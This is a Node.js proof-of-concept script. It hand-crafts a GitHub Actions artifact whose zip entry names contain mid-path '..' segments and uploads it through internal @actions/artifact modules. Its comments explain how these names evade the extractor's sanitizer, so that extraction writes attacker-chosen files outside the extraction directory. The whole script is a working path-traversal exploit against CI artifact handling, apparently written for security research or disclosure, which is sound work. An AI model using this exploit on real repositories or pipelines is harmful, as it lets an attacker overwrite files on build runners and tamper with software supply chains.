#!/usr/bin/env node
// PoC plumbing: upload an artifact whose zip entry names contain mid-path "..".
// Uses the same @actions/artifact internals that actions/upload-artifact uses,
// but with a handcrafted upload specification (real filesystem paths can never
// contain ".." so the official action cannot produce these names).
const fs = require('fs')
const path = require('path')

const A = '@actions/artifact'
const { createZipUploadStream } = require(`${A}/lib/internal/upload/zip`)
const { uploadZipToBlobStorage } = require(`${A}/lib/internal/upload/blob-upload`)
const { internalArtifactTwirpClient } = require(`${A}/lib/internal/shared/artifact-twirp-client`)
const { getBackendIdsFromToken } = require(`${A}/lib/internal/shared/util`)
const { StringValue } = require(`${A}/lib/generated`)

async function main() {
  const name = process.env.INPUT_NAME
  const pairs = (process.env.INPUT_PAIRS || '').split(',').filter(Boolean)
  const extractRoot = process.env.INPUT_EXTRACT_ROOT
  const workspace = process.env.GITHUB_WORKSPACE

  console.log(`extract root: ${extractRoot}`)
  const spec = []
  for (const pair of pairs) {
    const [src, target] = pair.split('->')
    const sourcePath = path.join(workspace, src.trim())
    const targetAbs = target.trim()
    // leading "x/" keeps the entry from starting with ".."; the mid-path ".."
    // survives the extractor's sanitizer and path.join() normalizes it away,
    // so the write lands outside the extraction directory.
    const destinationPath = 'x/' + path.relative(path.join(extractRoot, 'x'), targetAbs)
    const resolved = path.join(extractRoot, destinationPath)
    if (resolved !== targetAbs) throw new Error(`path computation mismatch: ${resolved} != ${targetAbs}`)
    console.log(`entry ${JSON.stringify(destinationPath)} -> ${resolved}`)
    spec.push({ sourcePath, destinationPath, stats: fs.lstatSync(sourcePath) })
  }

  const backendIds = getBackendIdsFromToken()
  const client = internalArtifactTwirpClient()

  const createResp = await client.CreateArtifact({
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name,
    version: 4
  })
  if (!createResp.ok) throw new Error('CreateArtifact: response not ok')

  const zipStream = await createZipUploadStream(spec)
  const uploadResult = await uploadZipToBlobStorage(createResp.signedUploadUrl, zipStream)

  const finalizeReq = {
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name,
    size: uploadResult.uploadSize ? uploadResult.uploadSize.toString() : '0'
  }
  if (uploadResult.sha256Hash)
    finalizeReq.hash = StringValue.create({ value: `sha256:${uploadResult.sha256Hash}` })

  const finalizeResp = await client.FinalizeArtifact(finalizeReq)
  if (!finalizeResp.ok) throw new Error('FinalizeArtifact: response not ok')
  console.log(`artifact ${name} uploaded: id=${finalizeResp.artifactId} size=${uploadResult.uploadSize}`)
}

main().catch(e => {
  console.error(e)
  process.exit(1)
})
